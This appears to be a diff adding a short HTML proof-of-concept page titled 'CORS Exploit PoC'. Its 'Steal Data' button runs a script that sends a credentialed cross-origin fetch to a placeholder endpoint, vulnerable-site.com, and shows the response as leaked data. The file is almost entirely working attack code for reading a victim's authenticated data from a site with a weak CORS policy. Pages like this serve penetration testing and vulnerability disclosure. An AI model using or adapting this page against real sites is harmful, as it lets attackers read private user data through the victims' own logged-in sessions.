@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS Exploit Test</title>
+</head>
+<body>
+  <h1>CORS Exploit PoC</h1>
+  <button onclick="stealData()">Steal Data</button>
+
+  <pre id="output">Waiting...</pre>
+
+  <script>
+    function stealData() {
+      fetch("https://vulnerable-site.com/api/data", {
+        method: "GET",
+        credentials: "include" // include cookies or credentials
+      })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error("Network response was not ok");
+        }
+        return response.text(); // or .json() depending on the response
+      })
+      .then(data => {
+        document.getElementById("output").textContent = "Leaked data:\n" + data;
+      })
+      .catch(error => {
+        document.getElementById("output").textContent = "Error:\n" + error;
+      });
+    }
+  </script>
+</body>
+</html>
